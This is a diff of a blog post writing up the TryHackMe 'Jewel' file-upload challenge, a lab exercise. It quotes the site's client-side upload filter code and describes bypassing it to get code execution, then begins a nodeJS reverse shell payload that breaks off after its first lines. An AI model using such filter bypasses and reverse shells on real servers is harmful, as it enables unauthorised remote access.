@@ -5,12 +5,16 @@ date:   2023-02-15 15:33:00 +0100
 category: "Cyber-Security"
 ---
 
+I recently completed the "[File Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)" room on TryHackMe, and I figured I'd do a writup on how I completed the challenge room, "Jewel".
+
+---
+
 I started out by visiting the web-page though Burp Suite's browser, which generated a sitemap:
 The page appeared to advertise uploading a photo of some kind, so I tested uploading standard `jpg`, and `gif` files.
 
 The JPEG file was able to be uploaded, but the GIF file was blocked for being too large. This put the upload limit somewhere between 21KB and 484KB.
 
-By now the sitemap had mostly filled out, which showed a `/content` directory, which I guessed would contain the uploaded files, as well as some JavaScript code that appeared to be getting used to filter uploads:
+By now the sitemap had mostly filled out, which showed a `/content` directory, which I guessed would contain the uploaded files, as well as some JavaScript code in  the `/assets` directory that appeared to be getting used to filter uploads:
 ```javascript
 // ...
             //Check File Size
@@ -18,11 +22,13 @@ By now the sitemap had mostly filled out, which showed a `/content` directory, w
                 setResponseMsg("File too big", "red");			
                 return;
             }
+
             //Check Magic Number
             if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
                 setResponseMsg("Invalid file format", "red");
                 return;	
             }
+
             //Check File Extension
             const extension = fileBox.name.split(".")[1].toLowerCase();
             if (extension != "jpg" && extension != "jpeg"){
@@ -31,6 +37,7 @@ By now the sitemap had mostly filled out, which showed a `/content` directory, w
             }
 // ...
 ```
+
 This revealed three checks that the developed intended to be satisfied for the file upload to start client-side:
 - The file must be smaller than 50KB (`(8 * 1204) * 50`) bits
 - The file must have the extension `.jpg` or `.jpeg`
@@ -56,7 +63,7 @@ Front-End-Https: on
 ```
 
 The server was running `express.js` on Ubuntu. As such, I started looking for potential webshell or reverse shell payloads that could work.
-Express is a framework on top of `node.js`, so I found a nodeJS payload I could use:
+Express is a framework on top of `node.js`, so I found a `nodeJS` payload I could use:
 ```node
 (function(){
     var net = require("net"),
